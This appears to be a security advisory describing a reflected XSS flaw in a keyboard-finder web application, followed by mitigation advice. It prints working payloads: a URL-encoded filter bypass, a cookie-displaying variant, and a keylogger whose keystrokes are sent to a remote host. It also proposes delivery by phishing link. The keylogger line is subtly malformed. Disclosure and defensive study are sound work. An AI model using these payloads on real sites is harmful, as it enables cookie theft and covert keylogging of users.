# Mechanical Keyboard Finder Version 4.31 Cross Site Scripting

Mechanical Keyboard Finder Version 4.31 was discovered to contain a cross site scripting vulnerability.

### Sample payload:

```
</h3><img src=x onerror=prompt(document.domain)><h3>
```

This will cleanly close off the encompassing h3 tag and allow us to execute javascript code to display an alert to the screen with the name of the vulnerable domain.

*Note: in scenarios where the application does some form of basic input sanitization searching for bad characters we could url encode our payload like so:*

```
Sample payload encoded:
%3C%2Fh3%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3E%3Ch3%3E
```

# Taking it Further

The XSS vulnerability happens to be reflected in the URL. This means we could carry out the XSS attack by providing a simple link in a phishing campaign. Displaying user cookies could be done with the following payload:

```
</h3><img src=x onerror=prompt(document.cookie)><h3>
```

Keylogging and shipping the data off to a remote server is also quite simple:

```
</h3><img src=x onerror=prompt'document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'><h3>
```

From here the possibilities are endless. There are quite a few XSS payloads on the web. Some possible attack scenarios include:

* Account Hijacking
* Port Scanning
* Spying/Keylogging
* Browser Hooking with BeEF
* Installing Backdoors/Malware

# Mitigation

OWASP recommends the following actions to prevent such attacks:

*For XSS attacks to be successful, an attacker needs to insert and execute malicious content in a webpage. Each variable in a web application needs to be protected. Ensuring that all variables go through validation and are then escaped or sanitized is known as perfect injection resistance. Any variable that does not go through this process is a potential weakness. Frameworks make it easy to ensure variables are correctly validated and escaped or sanitised. However, frameworks aren't perfect and security gaps still exist in popular frameworks like React and Angular. Output Encoding and HTML Sanitization help address those gaps.*

# References

* https://portswigger.net/web-security/cross-site-scripting
* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
* https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
* https://www.owasp.org/index.php/Testing_for_Cross_site_scripting
* https://www.geeksforgeeks.org/dhtml-javascript/
* https://mechanicalkeyboards.com/about.php
* https://www.owasp.org/index.php/DOM_Based_XSS
* https://www.w3schools.com/html/html_entities.asp
* https://www.google.com/about/appsecurity/learning/xss/
* https://www.php.net/manual/en/function.htmlspecialchars.php
* https://www.php.net/manual/en/function.htmlentities.php
